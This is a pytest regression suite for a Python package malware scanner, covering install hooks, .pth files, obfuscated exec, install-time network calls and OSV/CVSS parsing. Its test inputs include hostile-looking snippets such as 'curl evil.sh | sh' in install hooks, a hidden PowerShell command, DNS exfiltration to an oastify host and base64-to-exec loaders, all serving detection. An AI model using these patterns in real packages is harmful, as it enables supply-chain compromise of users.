"""Engine regression tests — offline except for the opt-in live OSV check."""

from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest

from api.schemas import Ecosystem, Severity, VulnSource
from engine import cve_matcher, cvss
from engine.cve_matcher import CveLookupError, parse_osv_response, query_osv
from engine.rules.code_patterns import RULE_DANGEROUS_CALL, RULE_OBFUSCATED
from engine.rules.install_hooks import RULE_INSTALL_HOOK, RULE_PTH
from engine.static_analyzer import _SEVERITY_ORDER, StaticAnalysisError, analyze_path
from engine.verdict import KNOWN_CWES, RULE_CATALOG

SAMPLES = Path(__file__).resolve().parents[1] / "samples"


def rules_in(findings) -> set[str]:
    return {f.rule for f in findings}


# ──────────────────────────────
# Layer 2 — samples/ end-to-end
# ──────────────────────────────


def test_samples_directory_is_scannable():
    findings = analyze_path(SAMPLES)
    assert findings, "the sample fixtures must produce findings"
    # Most severe first, so the router can slice the head for verdict reasons.
    ranks = [_SEVERITY_ORDER[f.severity] for f in findings]
    assert ranks == sorted(ranks)


@pytest.mark.parametrize(
    ("sample", "expected_rule"),
    [
        ("sample1_install_hook", RULE_DANGEROUS_CALL),
        ("sample1_install_hook", RULE_INSTALL_HOOK),
        ("sample2_obfuscated", RULE_OBFUSCATED),
        ("sample2_obfuscated", RULE_DANGEROUS_CALL),
        ("sample3_pth_autoexec", RULE_PTH),
        ("sample4_pickle", RULE_DANGEROUS_CALL),
        ("sample5_mcp_typosquat", RULE_PTH),
        ("sample5_mcp_typosquat", RULE_OBFUSCATED),
    ],
)
def test_each_sample_is_detected(sample, expected_rule):
    assert expected_rule in rules_in(analyze_path(SAMPLES / sample))


def test_pth_finding_is_high_and_tagged():
    findings = analyze_path(SAMPLES / "sample3_pth_autoexec")
    pth = [f for f in findings if f.rule == RULE_PTH]
    assert len(pth) == 1
    assert pth[0].severity is Severity.HIGH
    assert pth[0].cwe == "CWE-94"
    assert pth[0].location.endswith(":4")


# ──────────────────────────────
# Layer 2 — false-positive guards
# ──────────────────────────────


def test_pth_path_entries_are_not_flagged(tmp_path):
    """A normal .pth is a list of path entries — those must stay silent."""
    (tmp_path / "normal.pth").write_text(
        "../src\n/opt/company/lib\n# a comment\nimportlib_is_not_a_trigger\n",
        encoding="utf-8",
    )
    assert analyze_path(tmp_path) == []


def _wheel(root: Path) -> Path:
    info = root / "demo-1.0.dist-info"
    info.mkdir(parents=True)
    (info / "WHEEL").write_text("Wheel-Version: 1.0\n", encoding="utf-8")
    return root


def _pth_severity(root: Path, relpath: str) -> Severity:
    target = root / relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("import os\n", encoding="utf-8")
    [finding] = [f for f in analyze_path(root) if f.rule == RULE_PTH]
    return finding.severity


def test_pth_nested_inside_wheel_is_not_blocking(tmp_path):
    """실측 오탐 — litert-lm-nightly 휠이 번들한 가상환경 안의 .pth. site.py 가 안 본다."""
    rel = "litert_lm_cli/_litert-lm.venv/lib/python3.13/site-packages/bazel.pth"
    assert _pth_severity(_wheel(tmp_path), rel) is Severity.MEDIUM


@pytest.mark.parametrize(
    "rel", ["evil.pth", "demo-1.0.data/purelib/evil.pth", "demo-1.0.data/platlib/evil.pth"]
)
def test_pth_at_wheel_install_root_stays_high(tmp_path, rel):
    """휠 루트와 .data/purelib|platlib 는 site-packages 최상위로 설치된다."""
    assert _pth_severity(_wheel(tmp_path), rel) is Severity.HIGH


def test_pth_nested_inside_sdist_stays_high(tmp_path):
    """sdist 는 data_files 로 어느 경로의 파일이든 site-packages 최상위로 옮길 수 있다."""
    (tmp_path / "PKG-INFO").write_text("Name: demo\n", encoding="utf-8")
    assert _pth_severity(tmp_path, "src/data/evil.pth") is Severity.HIGH


def test_build_ext_override_is_not_flagged(tmp_path):
    """Compiled packages legitimately override build_ext."""
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\n"
        "setup(name='x', cmdclass={'build_ext': object})\n",
        encoding="utf-8",
    )
    assert RULE_INSTALL_HOOK not in rules_in(analyze_path(tmp_path))


def test_real_world_setup_py_does_not_produce_high_findings(tmp_path):
    """Regression: this exact shape blocked the real `requests` sdist.

    Lines 57/58 of requests' setup.py shell out, but only behind a `publish`
    argv guard, and line 79 is the near-universal __version__ idiom. Reporting
    them is fine; blocking on them is not.
    """
    (tmp_path / "setup.py").write_text(
        "import os, sys\n"
        "from setuptools import setup\n"
        "if sys.argv[-1] == 'publish':\n"
        "    os.system('python setup.py sdist bdist_wheel')\n"
        "    os.system('twine upload dist/*')\n"
        "    sys.exit()\n"
        "about = {}\n"
        "with open('pkg/__version__.py') as f:\n"
        "    exec(f.read(), about)\n"
        "setup(name='pkg', version=about['__version__'])\n",
        encoding="utf-8",
    )
    findings = analyze_path(tmp_path)
    assert findings, "the calls should still be reported as context"
    assert all(f.severity is not Severity.HIGH for f in findings)
    assert all(f.severity is not Severity.CRITICAL for f in findings)


def test_install_hook_that_executes_is_high(tmp_path):
    """`install` 을 가로챈 클래스가 실제로 뭔가 *실행*하면 그때 HIGH — 차단 대상."""
    (tmp_path / "setup.py").write_text(
        "import os\n"
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class Post(install):\n"
        "    def run(self):\n"
        "        os.system('curl evil.sh | sh')\n"
        "setup(name='x', cmdclass={'install': Post})\n",
        encoding="utf-8",
    )
    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
    assert len(hooks) == 1
    assert hooks[0].severity is Severity.HIGH


def test_install_hook_without_exec_sink_is_medium(tmp_path):
    """오버라이드 자체는 신호가 아니다 — 실행 싱크가 없으면 MEDIUM.

    실측 근거: setuptools 69.5.1 이 자기 setup.py:85 에서 install 을 오버라이드해
    .pth 를 심는다. 이걸 HIGH 로 두면 거의 모든 파이썬 환경에 깔려 있는 패키지가
    block 되고, 그런 스캐너는 아무도 켜두지 않는다. code_patterns.py 의 판단 기준과
    같다 — 존재가 아니라 조합이 신호다.
    """
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class WithPth(install):\n"
        "    def initialize_options(self):\n"
        "        install.initialize_options(self)\n"
        "        self.extra_path = ('x', 'y')\n"
        "setup(name='x', cmdclass={'install': WithPth})\n",
        encoding="utf-8",
    )
    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
    assert len(hooks) == 1
    assert hooks[0].severity is Severity.MEDIUM


def _hook_severity(tmp_path, body: str, imports: str = "") -> Severity:
    (tmp_path / "setup.py").write_text(
        f"{imports}from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class Post(install):\n"
        "    def run(self):\n"
        + "".join(f"        {line}\n" for line in body.splitlines())
        + "setup(name='x', cmdclass={'install': Post})\n",
        encoding="utf-8",
    )
    [hook] = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
    return hook.severity


@pytest.mark.parametrize(
    "body",
    [
        # 실측 오탐(fwquant·jdaviz·otpme) — 원래 설치를 진행시키는 위임 호출 + 파일 작업
        "install.run(self)\ninit_user_directory()",
        "super().run()",
        "cfg = {}\ncfg.get('k')\ndb.connect()",
        "pattern = re.compile('x')",
    ],
)
def test_install_hook_delegation_and_common_names_are_not_sinks(tmp_path, body):
    assert _hook_severity(tmp_path, body) is Severity.MEDIUM


@pytest.mark.parametrize(
    ("body", "imports"),
    [
        ("install.run(self)\nsubprocess.run(['sh', '-c', 'curl x | sh'])", "import subprocess\n"),
        ("requests.get('http://evil')", "import requests\n"),
        ("urllib.request.urlopen('http://evil')", "import urllib.request\n"),
        ("os.system('id')", "import os\n"),
        ("exec(payload)", ""),
    ],
)
def test_install_hook_real_sinks_stay_high(tmp_path, body, imports):
    assert _hook_severity(tmp_path, body, imports) is Severity.HIGH


@pytest.mark.parametrize(
    "src",
    [
        # 실측 오탐 seleniumbase — 버전 읽기 관용구. bytes.decode 는 codecs.decode 가 아니다
        "about = {}\nwith open('v.py', 'rb') as f:\n    exec(f.read().decode('utf-8'), about)\n",
        # 실측 오탐 tocode-cli — re.compile 은 정규식이지 코드 실행이 아니다
        "import re\nneedle = re.compile(re.escape(bytes.fromhex(pattern)))\n",
    ],
)
def test_common_idioms_are_not_obfuscated_payloads(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    assert RULE_OBFUSCATED not in rules_in(analyze_path(tmp_path))


@pytest.mark.parametrize(
    "src",
    [
        "import codecs\nexec(codecs.decode(P, 'rot13'))\n",
        "from codecs import decode\nexec(decode(P, 'rot13'))\n",
        "exec(bytes.fromhex(P))\n",
        "import builtins, base64\nbuiltins.exec(base64.b64decode(P))\n",
    ],
)
def test_real_decode_then_execute_still_high(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    obf = [f for f in analyze_path(tmp_path) if f.rule == RULE_OBFUSCATED]
    assert obf and obf[0].severity is Severity.HIGH


def test_method_named_eval_is_not_a_dangerous_call(tmp_path):
    (tmp_path / "mod.py").write_text("model.eval()\nexpr.compile()\n", encoding="utf-8")
    assert analyze_path(tmp_path) == []


def test_install_hook_defined_elsewhere_is_reported_not_blocked(tmp_path):
    """클래스가 다른 모듈에 있으면 들여다볼 수 없다 — 조용히 넘기지 않되 차단도 안 한다."""
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\n"
        "from mypkg.cmds import Custom\n"
        "setup(name='x', cmdclass={'install': Custom})\n",
        encoding="utf-8",
    )
    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
    assert len(hooks) == 1
    assert hooks[0].severity is Severity.MEDIUM
    assert "could not inspect" in hooks[0].detail


def test_build_only_command_override_stays_medium(tmp_path):
    """`sdist`/`bdist_wheel` run for the publisher, not the installing user."""
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='x', cmdclass={'sdist': object})\n",
        encoding="utf-8",
    )
    hooks = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
    assert len(hooks) == 1
    assert hooks[0].severity is Severity.MEDIUM


def test_samples_still_yield_a_blocking_signal():
    """Each malicious sample must keep at least one HIGH after the retune."""
    for sample in (
        "sample1_install_hook",
        "sample2_obfuscated",
        "sample3_pth_autoexec",
        "sample5_mcp_typosquat",
    ):
        findings = analyze_path(SAMPLES / sample)
        assert any(f.severity is Severity.HIGH for f in findings), sample


def test_subprocess_without_shell_is_not_flagged(tmp_path):
    (tmp_path / "mod.py").write_text(
        "import subprocess\nsubprocess.run(['ls', '-la'])\n", encoding="utf-8"
    )
    assert analyze_path(tmp_path) == []


def test_decoder_without_exec_sink_is_not_flagged(tmp_path):
    """b64decode on its own is ordinary; only decode-into-exec is the signal."""
    (tmp_path / "mod.py").write_text(
        "import base64\nlogo = base64.b64decode(ICON)\n", encoding="utf-8"
    )
    assert RULE_OBFUSCATED not in rules_in(analyze_path(tmp_path))


# ──────────────────────────────
# Layer 2 — rule detail
# ──────────────────────────────


def test_from_import_form_is_detected(tmp_path):
    """`from os import system` must match the same rule as `os.system`."""
    (tmp_path / "mod.py").write_text(
        "from os import system\nsystem('id')\n", encoding="utf-8"
    )
    findings = analyze_path(tmp_path)
    assert RULE_DANGEROUS_CALL in rules_in(findings)
    assert findings[0].cwe == "CWE-78"


def test_shell_true_is_detected(tmp_path):
    (tmp_path / "mod.py").write_text(
        "import subprocess\nsubprocess.run('curl evil', shell=True)\n", encoding="utf-8"
    )
    assert RULE_DANGEROUS_CALL in rules_in(analyze_path(tmp_path))


def test_nested_decode_chain_is_detected(tmp_path):
    (tmp_path / "mod.py").write_text(
        "import base64, zlib\nexec(zlib.decompress(base64.b64decode(P)))\n",
        encoding="utf-8",
    )
    assert RULE_OBFUSCATED in rules_in(analyze_path(tmp_path))


def test_unparseable_python_is_skipped_not_fatal(tmp_path):
    (tmp_path / "legacy.py").write_text("print 'python 2'\n", encoding="utf-8")
    assert analyze_path(tmp_path) == []


def test_missing_path_raises():
    with pytest.raises(StaticAnalysisError):
        analyze_path(SAMPLES / "does-not-exist")


# ──────────────────────────────
# CWE catalogue consistency
# ──────────────────────────────


def test_every_emitted_cwe_is_declared():
    """Guards against a rule quietly introducing an unreviewed CWE tag."""
    for finding in analyze_path(SAMPLES):
        info = RULE_CATALOG.get(finding.rule)
        assert info is not None, f"{finding.rule} missing from RULE_CATALOG"
        assert finding.cwe in info.cwes
        assert finding.cwe in KNOWN_CWES


# ──────────────────────────────
# Layer 1 — OSV parsing
# ──────────────────────────────

OSV_PAYLOAD = {
    "vulns": [
        {
            "id": "GHSA-9wx4-h78v-vm56",
            "summary": "Requests leaks Proxy-Authorization headers on redirect",
            "database_specific": {"severity": "MODERATE"},
            "affected": [
                {
                    "package": {"name": "Requests", "ecosystem": "PyPI"},
                    "ranges": [
                        {
                            "type": "ECOSYSTEM",
                            "events": [{"introduced": "0"}, {"fixed": "2.31.0"}],
                        }
                    ],
                }
            ],
        },
        {
            "id": "PYSEC-0000-1",
            "database_specific": {"severity": "CRITICAL"},
            "affected": [{"package": {"name": "other-pkg", "ecosystem": "PyPI"}}],
        },
        {
            # Truncated CVSS vector, no coarse label -> documented medium fallback.
            "id": "CVE-0000-0000",
            "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N"}],
        },
        {
            # PYSEC entries often carry a GIT range whose "fixed" is a commit.
            "id": "PYSEC-0000-2",
            "affected": [
                {
                    "package": {"name": "requests", "ecosystem": "PyPI"},
                    "ranges": [
                        {
                            "type": "GIT",
                            "events": [{"fixed": "74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5"}],
                        }
                    ],
                }
            ],
        },
    ]
}


def test_parse_osv_maps_contract_fields():
    vulns = parse_osv_response(OSV_PAYLOAD, "requests")
    assert [v.id for v in vulns] == [
        "GHSA-9wx4-h78v-vm56",
        "PYSEC-0000-1",
        "CVE-0000-0000",
        "PYSEC-0000-2",
    ]
    assert all(v.source is VulnSource.OSV for v in vulns)

    ghsa = vulns[0]
    assert ghsa.severity is Severity.MEDIUM  # GitHub's "MODERATE"
    assert ghsa.fixed_version == "2.31.0"  # matched despite "Requests" casing
    assert ghsa.summary


def test_fixed_version_ignores_other_packages():
    """An advisory covering several projects must not leak another's fix."""
    assert parse_osv_response(OSV_PAYLOAD, "requests")[1].fixed_version is None


def test_unscorable_cvss_entry_falls_back_to_medium():
    assert parse_osv_response(OSV_PAYLOAD, "requests")[2].severity is Severity.MEDIUM


@pytest.mark.parametrize(
    ("vector", "expected"),
    [
        # Reference scores from the FIRST CVSS v3.1 calculator.
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", 9.8),
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", 10.0),
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1),
        ("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 5.5),
        ("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9),
        ("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", 6.4),
        ("CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N", 1.6),
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N", 0.0),
    ],
)
def test_cvss_base_score_matches_reference(vector, expected):
    assert cvss.base_score(vector) == expected


@pytest.mark.parametrize(
    "vector",
    [
        "CVSS:3.1/AV:N/AC:L/PR:N",  # truncated
        "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",  # v4: not scored
        "CVSS:3.1/AV:X/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # bad value
        "garbage",
    ],
)
def test_cvss_rejects_unscorable_vectors(vector):
    assert cvss.base_score(vector) is None


def test_cvss_vector_sets_severity_when_label_missing():
    payload = {
        "vulns": [
            {
                "id": "CVE-A",
                "severity": [
                    {"type": "CVSS_V4", "score": "CVSS:4.0/AV:N"},
                    {"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
                ],
            },
            {
                "id": "CVE-B",
                "affected": [
                    {
                        "package": {"name": "requests", "ecosystem": "PyPI"},
                        "severity": [
                            {
                                "type": "CVSS_V3",
                                "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
                            }
                        ],
                    }
                ],
            },
            {
                # The coarse label still wins over a vector.
                "id": "CVE-C",
                "database_specific": {"severity": "LOW"},
                "severity": [
                    {"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}
                ],
            },
        ]
    }
    got = [v.severity for v in parse_osv_response(payload, "requests")]
    assert got == [Severity.CRITICAL, Severity.MEDIUM, Severity.LOW]


def test_git_range_is_not_reported_as_a_fixed_version():
    """A commit hash is not something a user can `pip install`."""
    assert parse_osv_response(OSV_PAYLOAD, "requests")[3].fixed_version is None


def test_empty_response_is_no_vulnerabilities():
    assert parse_osv_response({}, "requests") == []


@pytest.mark.parametrize(
    ("raw", "normalized"),
    [("Foo.Bar_baz", "foo-bar-baz"), ("zope--interface", "zope-interface")],
)
def test_name_normalization(raw, normalized):
    assert cve_matcher._normalize_name(raw) == normalized


# ──────────────────────────────
# Layer 1 — transport behaviour
# ──────────────────────────────


async def test_query_osv_sends_expected_body():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.read()))
        return httpx.Response(200, json=OSV_PAYLOAD)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        vulns = await query_osv("requests", "2.30.0", client=client)

    assert seen["package"] == {"name": "requests", "ecosystem": "PyPI"}
    assert seen["version"] == "2.30.0"
    assert len(vulns) == 4


async def test_upstream_failure_raises_lookup_error():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(500)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        with pytest.raises(CveLookupError):
            await query_osv("requests", "2.30.0", client=client)


async def test_network_error_raises_lookup_error():
    def handler(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("no route to host")

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        with pytest.raises(CveLookupError):
            await query_osv("requests", "2.30.0", client=client)


@pytest.mark.live
async def test_live_osv_lookup():
    """Opt-in: `uv run pytest -m live`. Hits the real OSV.dev API."""
    vulns = await query_osv("requests", "2.30.0", ecosystem=Ecosystem.PIP)
    assert any(v.id.startswith(("GHSA", "CVE", "PYSEC")) for v in vulns)


def test_analyze_path_skips_dirs_that_never_execute(tmp_path):
    """tests/examples/docs 안의 코드는 install·import 시점에 실행되지 않는다.

    테스트 스위트는 eval()·exec() 를 쓰는 게 정상이라 그 탐지는 신호가 아니라 노이즈고,
    진짜 발견을 화면 밖으로 밀어낸다. PyYAML 5.3.1 실측: 17건 -> 10건, 사라진 7건이
    전부 tests/ 안의 eval()/exec() 였고 lib/yaml/__init__.py 의 pickle.load() 6건은 남았다.
    api/routers/scan.py 의 Bandit 레이어와 같은 정책 — 두 정적 레이어가 "패키지 코드"의
    범위를 다르게 보면 안 된다.
    """
    payload = "import pickle\ndef f(b):\n    return pickle.loads(b)\n"
    (tmp_path / "real.py").write_text(payload, encoding="utf-8")
    for noise in ("tests", "examples", "docs"):
        (tmp_path / noise).mkdir()
        (tmp_path / noise / "mod.py").write_text(payload, encoding="utf-8")
    # 디렉터리 이름 정확 일치여야 한다 — docs 로 시작하는 모듈은 진짜 배포 코드다.
    (tmp_path / "docs_helper.py").write_text(payload, encoding="utf-8")

    scanned = {f.location.split(":")[0] for f in analyze_path(tmp_path)}
    assert scanned == {"real.py", "docs_helper.py"}


# ──────────────────────────────
# Layer 2 — 설치·import 시점 실행 (실제 악성 300개·정상 상위 300개 실측 근거)
# ──────────────────────────────

from engine.rules.install_time import RULE_EXFIL, RULE_INSTALL_TIME  # noqa: E402
from engine.static_analyzer import analyze_files  # noqa: E402


def _high_rules(files: dict[str, str]) -> set[str]:
    # 진짜 sdist 처럼 — 루트에 늘 PKG-INFO 가 있다 (설치 스크립트 판별 근거)
    roots = {k.split("/")[0] for k in files if k.endswith("/setup.py")}
    files = {**{f"{r}/PKG-INFO": "Name: p" for r in roots}, **files}
    return {f.rule for f in analyze_files(files) if f.severity is Severity.HIGH}


@pytest.mark.parametrize(
    "files",
    [
        # esq* 시리즈 — setup.py 최상단의 숨김 PowerShell
        {"p-1/setup.py": "import subprocess\ntry:\n    subprocess.Popen('powershell -WindowStyle "
                         "Hidden -EncodedCommand AAAA', shell=False)\nexcept: pass\n"},
        # 훅 없이 최상단에서 다운로드
        {"p-1/setup.py": "from urllib.request import urlopen\nexec(urlopen('http://x').read())\n"},
        # dependency-confusion — 훅이 같은 파일 함수를 부르고, 그 안에서 DNS 유출
        {"p-1/setup.py": "import socket\nfrom setuptools.command.install import install\n"
                         "def leak():\n    socket.getaddrinfo('a.b.oastify.com', 80)\n"
                         "class I(install):\n    def run(self):\n        install.run(self)\n"
                         "        leak()\nsetup(cmdclass={'install': I})\n"},
        # fluiddaddy — 별칭으로 숨긴 os.system + 창 없는 파이썬
        {"p-1/setup.py": "from os import system as _s\n_s('start pythonw.exe x.py')\n"},
        # asmutation — 훅이 패키지 안 main.py 의 main() 을 불러 실행
        {"p-1/setup.py": "from setuptools.command.install import install\n"
                         "class I(install):\n    def run(self):\n        install.run(self)\n"
                         "        from main import main\n        main()\n"
                         "setup(cmdclass={'install': I})\n",
         "p-1/main.py": "import requests\ndef main():\n    requests.post('http://x', data='h')\n"},
        # import 시점 페이로드 — 패키지 __init__ 최상단
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "import requests\nrequests.get('http://x')\n"},
    ],
)
def test_install_and_import_time_payloads_are_high(files):
    assert RULE_INSTALL_TIME in _high_rules(files)


def test_hardcoded_webhook_token_is_high_anywhere():
    url = "https://discord.com/api/webhooks/1106188549532950589/" + "a" * 68
    assert RULE_EXFIL in _high_rules({"p-1/pkg/util.py": f"def f():\n    return '{url}'\n"})


@pytest.mark.parametrize(
    "files",
    [
        # 버전용 git 명령 — 평범한 빌드 명령은 수상하지 않다
        {"p-1/setup.py": "import subprocess\n"
                         "v = subprocess.check_output(['git', 'describe', '--tags'])\n"},
        # 통신하지 않는 생성자·로컬 조회 (litellm·dnspython·dill)
        {"p-1/setup.py": "", "p-1/pkg/__init__.py":
            "import httpx, socket, requests\nT = httpx.Timeout(5)\nS = requests.Session()\n"
            "P = socket.getprotobyname('tcp')\n"},
        # import 되지 않는 보조 스크립트 (fastapi·black·pyzmq)
        {"p-1/setup.py": "", "p-1/scripts/fetch.py": "import httpx\nhttpx.get('http://x')\n"},
        # nodeenv — setup.py 는 버전만 가져오고, 다운로드 함수는 부르지 않는다
        {"p-1/setup.py": "from nodeenv import nodeenv_version\nsetup(version=nodeenv_version)\n",
         "p-1/nodeenv.py": "from urllib.request import urlopen\nnodeenv_version = '1.0'\n"
                           "def download():\n    return urlopen('https://nodejs.org')\n"},
        # 함수 안의 네트워크 호출은 부르기 전엔 돌지 않는다
        {"p-1/setup.py": "", "p-1/pkg/__init__.py":
            "import requests\ndef fetch():\n    return requests.get('http://x')\n"},
    ],
)
def test_benign_install_and_import_time_code_is_not_high(files):
    assert RULE_INSTALL_TIME not in _high_rules(files)


def test_unreadable_files_are_reported_not_silently_skipped(tmp_path, monkeypatch):
    """백신이 읽기를 막은 파일(Windows: OSError 22)은 '검사했고 깨끗했다'가 되면 안 된다."""
    from engine.rules import base

    (tmp_path / "setup.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(base.DiskTree, "read", lambda self, rel: None)
    unreadable: list[str] = []
    assert analyze_path(tmp_path, unreadable=unreadable) == []
    assert unreadable == ["setup.py"]


# ── 난독화 변형 (실제 악성 300개 중 놓친 것들의 구조) ──────────────


@pytest.mark.parametrize(
    "src",
    [
        # aio3·pthttp — import 문 없이 __import__ 로 이름 숨기기
        "__import__('builtins').exec(__import__('builtins').compile("
        "__import__('base64').b64decode(P), '<string>', 'exec'))\n",
        # xolo* — 모듈 별칭
        "import base64 as b\nexec(b.b64decode(P))\n",
        # colors-update·promptcolor — chr() 로 소스 조립
        "eval(''.join(chr(c) for c in [112, 114, 105, 110, 116]))\n",
        # dasdsajdjsadsad·forgepys — 자체 디코더 람다
        "import base64, zlib\n__vare__ = lambda s: zlib.decompress(base64.b64decode(s))\n"
        "exec(__vare__(P))\n",
        # invokehttp — 자체 디코더 함수를 한 번 더 감싼 경우
        "import base64\ndef _d(s):\n    return base64.b64decode(s)\n"
        "def invoke(s):\n    return _d(s)\nexec(invoke(P))\n",
        # aes44 — 디코딩 결과를 변수에 담았다가 실행
        "import base64\ncode = base64.b64decode(P)\neval(compile(code, '<x>', 'exec'))\n",
    ],
)
def test_wrapped_decode_then_execute_is_high(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    obf = [f for f in analyze_path(tmp_path) if f.rule == RULE_OBFUSCATED]
    assert obf and obf[0].severity is Severity.HIGH


@pytest.mark.parametrize(
    "src",
    [
        # 소스 파일을 읽어 실행하는 평범한 관용구 — 디코딩이 없다
        "src = open('v.py').read()\nexec(compile(src, 'v.py', 'exec'))\n",
        # 디코딩 함수가 있어도 그 결과를 실행하지 않는다
        "import base64\ndef token(s):\n    return base64.b64decode(s)\nprint(token(P))\n",
        # 이름이 join 이어도 chr 조립이 아니다
        "eval(', '.join(names))\n",
    ],
)
def test_ordinary_exec_and_decoding_stay_quiet(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    assert RULE_OBFUSCATED not in {
        f.rule for f in analyze_path(tmp_path) if f.severity is Severity.HIGH
    }


def test_oversized_setup_py_is_still_scanned():
    """실측: libida — 2MB 를 넘긴 setup.py 가 크기 상한 때문에 검사에서 통째로 빠졌다."""
    pad = "#" + "x" * (3 * 1024 * 1024) + "\n"
    src = "from base64 import b64decode\nexec(b64decode(P).decode())\n" + pad
    assert RULE_OBFUSCATED in _high_rules({"p-1/setup.py": src})
    # 진입점이 아닌 큰 모듈은 예전처럼 건너뛴다 (생성된 표·데이터)
    assert _high_rules({"p-1/pkg/table.py": src}) == set()


# ── held-out 에서 놓친 두 계열 ──────────────────────────────────────


@pytest.mark.parametrize(
    "src",
    [
        # robloxlogger 계열 — 실행 함수를 문자열에서 꺼내 밑줄 이름으로 숨김
        "_____ = eval('eval')\n_____(payload)\n",
        "import builtins\n___ = builtins.eval('exec')\n",
        # pyfastdownload 계열 — map(chr, ...) 로 소스 조립
        "exec(''.join(map(chr, [112, 114, 105, 110, 116])))\n",
    ],
)
def test_hidden_sink_and_map_chr_are_high(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    obf = [f for f in analyze_path(tmp_path) if f.rule == RULE_OBFUSCATED]
    assert obf and obf[0].severity is Severity.HIGH


@pytest.mark.parametrize(
    "src",
    [
        "x = eval('1 + 1')\n",               # 평범한 식 평가 — 실행 함수를 꺼내는 게 아니다
        "names = ''.join(map(str, ids))\n",  # map 이어도 chr 가 아니다
        "exec_ = getattr(builtins, 'exec')\n",  # six 의 호환 관용구 — 문자열 eval 이 아니다
    ],
)
def test_ordinary_eval_and_join_stay_quiet(tmp_path, src):
    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
    assert RULE_OBFUSCATED not in {
        f.rule for f in analyze_path(tmp_path) if f.severity is Severity.HIGH
    }


# ── 감시기 실측 오탐 (2026-10-17, 새 규칙으로 신규 업로드 1,900여 건) ──────


@pytest.mark.parametrize(
    "files",
    [
        # rpi-hwid — and 로 덧붙인 main 가드 안
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "",
         "p-1/pkg/fpga.py": "import requests\ndef main():\n    requests.get('http://x')\n"
                            "if __name__ == '__main__' and not globals().get('E'):\n    main()\n"},
        # fd-open-data-mcp — 함수 안에 정의된 웹 핸들러는 요청이 올 때 돈다
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "",
         "p-1/pkg/app.py": "from urllib.request import urlopen\n"
                           "def _proxy(u):\n    return urlopen(u)\n"
                           "def create_app():\n    def handler():\n        return _proxy('http://x')\n"
                           "    return handler\napp = create_app()\n"},
        # pigeon-home-runner — 패키지 안의 setup.py 라는 이름의 일반 모듈(설정 마법사)
        {"p-1/setup.py": "", "p-1/runner/__init__.py": "",
         "p-1/runner/setup.py": "from oauth import refresh\ndef wizard():\n    refresh()\n",
         "p-1/runner/oauth.py": "from urllib.request import urlopen\n"
                                "def refresh():\n    return urlopen('https://oauth')\n"},
        # rutis — __main__.py 는 python -m 으로 실행할 때만 돈다
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "",
         "p-1/pkg/__main__.py": "import socket\nsocket.create_connection(('x', 80))\n"},
        # rapid-mlx — 패키지에 딸린 통합 테스트가 최상단에서 로컬 서버에 묻는다
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "",
         "p-1/pkg/_integration_tests/__init__.py": "",
         "p-1/pkg/_integration_tests/test_sdk.py": "import httpx\nhttpx.get('http://localhost')\n"},
        {"p-1/setup.py": "", "p-1/pkg/__init__.py": "",
         "p-1/pkg/conftest.py": "import httpx\nhttpx.get('http://localhost')\n"},
    ],
)
def test_watcher_observed_benign_patterns_are_not_high(files):
    assert RULE_INSTALL_TIME not in _high_rules(files)


def test_local_module_finding_points_at_the_module_not_setup_py():
    files = {
        "p-1/PKG-INFO": "Name: p",
